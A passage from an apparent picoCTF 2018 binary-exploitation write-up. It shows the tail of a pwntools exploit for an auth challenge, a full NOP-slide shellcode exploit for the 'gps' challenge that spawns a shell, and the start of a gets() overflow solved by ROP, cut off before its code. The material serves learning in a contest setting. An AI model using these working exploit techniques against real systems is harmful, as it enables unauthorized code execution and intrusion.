REQUESTED_ACCESS_LEVEL <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5</span>

<span style="color:#ff79c6">if</span> DEV:
    r <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./auth&#39;</span>)
<span style="color:#ff79c6">else</span>:
    r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;2018shell.picoctf.com&#34;</span>, <span style="color:#bd93f9">41208</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">send_command</span>(command):
    r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>)
    r<span style="color:#ff79c6">.</span>sendline(command)
    <span style="color:#ff79c6">return</span> r<span style="color:#ff79c6">.</span>recvline()

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>():
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;show&#34;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">login</span>(name):
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Logging in as </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> (</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">)&#34;</span><span style="color:#ff79c6">.</span>format(name, enhex(name)))
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;login &#34;</span> <span style="color:#ff79c6">+</span> name)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_auth</span>(auth):
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;set-auth &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(auth))

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_flag</span>():
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;get-flag&#34;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">reset</span>():
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Performing reset&#34;</span>)
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;reset&#34;</span>)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">quit</span>():
    <span style="color:#ff79c6">return</span> send_command(<span style="color:#f1fa8c">&#34;quit&#34;</span>)

login(<span style="color:#f1fa8c">&#34;a&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> p64(REQUESTED_ACCESS_LEVEL))
reset()
login(<span style="color:#f1fa8c">&#34;A&#34;</span>)
s <span style="color:#ff79c6">=</span> show()
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Login info: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(s))
<span style="color:#6272a4">#if &#34;[{}]&#34;.format(REQUESTED_ACCESS_LEVEL) in s:</span>
log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#34;Flag: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(get_flag()))
</code></pre></td></tr></table>
</div>
</div><h2 id="gps">gps</h2>
<ul>
<li>source: <a href="./resources/gps/gps.c">gps.c</a></li>
<li>binary: <a href="./resources/gps/gps.c">gps</a></li>
</ul>
<p>A goood explanation of <a href="http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/">checkseck and NX</a>:</p>
<p>The abbreviation NX stands for non-execute or non-executable segment. It means that the application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checksec gps
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/ctf/kali/picoCTF/binary-exploitation/gps/gps&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled		&lt;-- NX <span style="color:#8be9fd;font-style:italic">disabled</span> <span style="color:#ff79c6">=</span>&gt; stack is both writeable and executable
    PIE:      No PIE <span style="color:#ff79c6">(</span>0x400000<span style="color:#ff79c6">)</span>
    RWX:      Has RWX segments
</code></pre></td></tr></table>
</div>
</div><ol>
<li>The query_position() function will leak the approximate location of the <code>stk</code> local variable, which is equivalent to have an approximate location of the stack location</li>
<li>Also there is a huge <code>buffer</code> of size 0x1000 above the stack position of this <code>stk</code> address in the stack</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#define GPS_ACCURACY 1337
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span><span style="color:#50fa7b">query_position</span>() {
  <span style="color:#8be9fd">char</span> stk;
  <span style="color:#8be9fd">int</span> offset <span style="color:#ff79c6">=</span> rand() <span style="color:#ff79c6">%</span> GPS_ACCURACY <span style="color:#ff79c6">-</span> (GPS_ACCURACY <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">2</span>);
  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>ret <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>stk <span style="color:#ff79c6">+</span> offset;
  <span style="color:#ff79c6">return</span> ret;
}
[...]
<span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x1000</span>];
[...]
printf(<span style="color:#f1fa8c">&#34;We need to access flag.txt.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Current position: %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, query_position());
</code></pre></td></tr></table>
</div>
</div><p>Being provided the approximative address of <code>stk</code>, we should be able to make a good guess of an address within the buffer.</p>
<p>As we know the stack is executable and we can control the buffer[0x1000], we can craft a nop slide followed by a shellcode that fits in our buffer.</p>
<p>In python, it can be done with pwntools:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">BUFFER_SIZE <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1000</span>
shellcode <span style="color:#ff79c6">=</span> pwnlib<span style="color:#ff79c6">.</span>shellcraft<span style="color:#ff79c6">.</span>amd64<span style="color:#ff79c6">.</span>linux<span style="color:#ff79c6">.</span>sh()
sc_asm <span style="color:#ff79c6">=</span> asm(shellcode)
nop <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#39;</span>
payload <span style="color:#ff79c6">=</span> nop <span style="color:#ff79c6">*</span> (BUFFER_SIZE<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(sc_asm)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> sc_asm
</code></pre></td></tr></table>
</div>
</div><p>Then the program prompts us for our plan; our input will be the payload:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    printf(<span style="color:#f1fa8c">&#34;What&#39;s your plan?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    fgets(buffer, <span style="color:#ff79c6">sizeof</span>(buffer), stdin);
</code></pre></td></tr></table>
</div>
</div><p>The final input is our guess of an approximative address inside the buffer location. This address <code>location</code>will be indeed written and executed.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    printf(<span style="color:#f1fa8c">&#34;Where do we start?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    scanf(<span style="color:#f1fa8c">&#34;%p&#34;</span>, (<span style="color:#8be9fd">void</span><span style="color:#ff79c6">**</span>) <span style="color:#ff79c6">&amp;</span>location);

    location();
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">import</span> re

DEV <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>

context(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;amd64&#39;</span>, os<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;linux&#39;</span>, bits <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;64&#39;</span>)
h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">49351</span>

<span style="color:#6272a4">#print shellcraft.nop()</span>
<span style="color:#6272a4">#print &#39;######################&#39;</span>
<span style="color:#6272a4">#nop = asm(shellcraft.nop())</span>
<span style="color:#6272a4">#print nop</span>
<span style="color:#6272a4">#print &#39;######################&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">payload</span>():
    shellcode <span style="color:#ff79c6">=</span> pwnlib<span style="color:#ff79c6">.</span>shellcraft<span style="color:#ff79c6">.</span>amd64<span style="color:#ff79c6">.</span>linux<span style="color:#ff79c6">.</span>sh()
    sc_asm <span style="color:#ff79c6">=</span> asm(shellcode)
    BUFFER_SIZE <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1000</span>
    nop <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x90</span><span style="color:#f1fa8c">&#39;</span>
    payload <span style="color:#ff79c6">=</span> nop <span style="color:#ff79c6">*</span> (BUFFER_SIZE<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(sc_asm)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">+</span> sc_asm
    <span style="color:#ff79c6">return</span> payload

<span style="color:#ff79c6">if</span> DEV:
    p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./gps&#39;</span>)
<span style="color:#ff79c6">else</span>:
    p <span style="color:#ff79c6">=</span> remote(h, p)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">guess_approximate_buffer_address</span>():
    prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;&gt; &#39;</span>)
    current_address <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">&#34;Current position: (0x[a-fA-F0-9]+)&#34;</span>, prompt)<span style="color:#ff79c6">.</span>group(<span style="color:#bd93f9">1</span>)
    GPS_ACCURACY <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1337</span>
    guess <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(current_address, <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">+</span> GPS_ACCURACY
    <span style="color:#ff79c6">return</span> guess

guess <span style="color:#ff79c6">=</span> guess_approximate_buffer_address()
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Destination: 0x</span><span style="color:#f1fa8c">{:02x}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(guess))

p<span style="color:#ff79c6">.</span>sendline(payload())
p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;&gt; &#39;</span>)
p<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">format</span>(guess, <span style="color:#f1fa8c">&#39;x&#39;</span>))

p<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id="can-you-gets-me">can-you-gets-me</h2>
<ul>
<li>source: <a href="./resources/can-you-gets-me/gets.c">gets.c</a></li>
<li>binary: <a href="./resources/can-you-gets-me/gets.c">gets</a></li>
<li>Resource: <a href="https://github.com/JonathanSalwan/ROPgadget">RopGadget</a></li>
</ul>
<p>The code is vulnerable to buffer-overflow but the buffer is small and the stack is not executable</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">vuln</span>() {
  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">16</span>];
  printf(<span style="color:#f1fa8c">&#34;GIVE ME YOUR NAME!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  <span style="color:#ff79c6">return</span> gets(buf);
}
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checksec ./gets
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/ctf/kali/picoCTF/binary-exploitation/can-you-gets-me/gets&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled		&lt;-- not executable stack
    PIE:      No PIE <span style="color:#ff79c6">(</span>0x8048000<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Therefore a ROP chain is the right approach. We can use <a href="https://github.com/JonathanSalwan/ROPgadget">RopGadget</a> to streamline the crafting of a payload</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
